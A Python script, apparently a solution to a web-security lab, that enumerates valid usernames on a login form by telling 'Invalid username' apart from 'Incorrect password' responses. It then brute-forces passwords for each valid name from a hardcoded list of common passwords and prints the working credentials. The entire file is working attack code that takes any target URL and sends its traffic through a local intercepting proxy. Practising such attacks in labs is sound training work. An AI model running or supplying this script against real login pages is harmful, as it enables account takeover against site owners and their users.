import requests
import sys
import urllib3
from colorama import init, Fore

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
urllib3.disable_warnings()
init(autoreset=True)
usernames = ["carlos", "root", "admin", "test", "guest", "info", "adm", "mysql", "user","administrator", "oracle", "ftp", "pi", "puppet", "ansible", "ec2-user","vagrant", "azureuser", "academico", "acceso", "access", "accounting","accounts", "acid", "activestat", "ad", "adam", "adkit", "admin","administracion", "administrador", "administrator", "administrators","admins", "ads", "adserver", "adsl", "ae", "af", "affiliate", "affiliates","afiliados", "ag", "agenda", "agent", "ai", "aix", "ajax", "ak", "akamai","al", "alabama", "alaska", "albuquerque", "alerts", "alpha", "alterwind","am", "amarillo", "americas", "an", "anaheim", "analyzer", "announce","announcements", "antivirus", "ao", "ap", "apache", "apollo", "app","app01", "app1", "apple", "application", "applications", "apps", "appserver","aq", "ar", "archie", "arcsight", "argentina", "arizona", "arkansas","arlington", "as", "as400", "asia", "asterix", "at", "athena", "atlanta","atlas", "att", "au", "auction", "austin", "auth", "auto", "autodiscover"]
passwords = ["123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football", "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321", "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx", "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer", "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000", "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars", "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper", "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777", "pass", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea", "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin", "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor", "monitoring", "montana", "moon", "moscow"]

def Username_enumeration_via_different_responses(s, url):
    for username in usernames:
        data = {'username': username, 'password': 'lord'}
        r = s.post(url+'/login', data=data, verify=False, proxies=proxies)
        res = r.text
        if r.status_code == 200 and 'Invalid username' not in res and 'Incorrect password' in res:
            print(Fore.GREEN + f'[+] Valid username Found: {username}')
            for password in passwords:
                data = {'username': username, 'password': password}
                try:
                    r = s.post(url+'/login', data=data, verify=False, proxies=proxies)
                    res = r.text
                    if r.status_code == 200 and 'Invalid username' not in res and 'Incorrect password' not in res:
                        print(Fore.GREEN + f'[+] Password Found: {password}')
                        print(Fore.GREEN + f"[+] Valid credentials found: {username}:{password}")
                        sys.exit(-1)
                except requests.exceptions.RequestException:
                    pass
    
def main():
    try:
        if len(sys.argv) != 2:
            print(Fore.YELLOW + "[-] Usage : %s <URL>" % sys.argv[0])
            sys.exit(-1)
    except IndexError as e:
        print(Fore.RED + f"[-] Error: {e}")
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    Username_enumeration_via_different_responses(s, url)
    
if __name__ == '__main__':
    main()


